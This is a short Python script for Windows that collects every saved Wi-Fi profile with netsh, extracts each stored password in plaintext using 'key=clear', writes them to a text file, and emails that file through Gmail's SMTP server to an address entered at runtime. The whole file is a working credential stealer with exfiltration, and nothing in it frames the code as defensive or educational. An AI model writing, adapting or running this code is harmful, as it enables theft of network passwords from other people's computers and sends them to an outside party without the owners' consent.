import smtplib as smtp
import subprocess as subp
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import ssl

def main():
    #Run the command for user profiles and seperate them into lists
    data = subp.check_output(['netsh', 'wlan','show','profiles']).decode('utf-8').split('\n')
    #seperate the wifi data from the rest of the strings
    #Take each line create a list of the line with the delimiter being a colon
    #Only return the 2nd entry in each list into wifidata
    wifidata = [ line.split(':')[1] for line in data if "All User Profile" in line]
    clean(wifidata)
    secrets = []
    for wifi in wifidata:
        secrets.append(subp.check_output(['netsh', 'wlan','show','profiles',wifi,'key=clear']).decode('utf-8').split('\n'))
    passwords = []
    for secret in secrets:
        passwords.extend([line.split(':')[1] for line in secret if "Key Content" in line])

    clean(passwords)
    log(passwords, wifidata)
    sendinfo("container.txt")
    concatenate(passwords, wifidata)
    input("press any key to exit\n")
def clean(dirtydata):
    #Does what its name says
    i = 0
    for entry in dirtydata:
        dirtydata[i] = entry.strip('\r')
        dirtydata[i] = dirtydata[i].strip(' ')
        i+=1
def concatenate(keys, names):
    #print wifi name and password
    for i in range(len(keys)):
        try:
                print(f"Name: {names[i]}\nPassword: {keys[i]}\n")
        except IndexError:
            print(f"Name: {names[i]}\nPassword: Could not be read")
def log(keys, names):
    #print wifi name and password to a txt file
    container = open("container.txt","w+")
    for i in range(len(keys)):
        container.write(keys[i])
        container.write('\n')
        container.write(names[i])
        container.write('\n')
        container.write('\n')
    container.close()
    
def sendinfo(file):
    
    #establish message format
    message = MIMEMultipart()
    message['From'] = 'Dummy'
    message['To'] = 'Someone'
    message['Subject'] = 'wifi'
    
    #attach message
    with open(file, "r") as f:
        attachment = f.read()
    message.attach(MIMEText(attachment, 'plain'))
    
    #cast the message into a string
    text = message.as_string()
    
    #connext to server and send email
    context = ssl.create_default_context()
    with smtp.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
        server.login(input("Enter email: "),input("Enter Password: "))
        server.sendmail(input("Enter email: "),input("Email destination: "), text)
    
main()
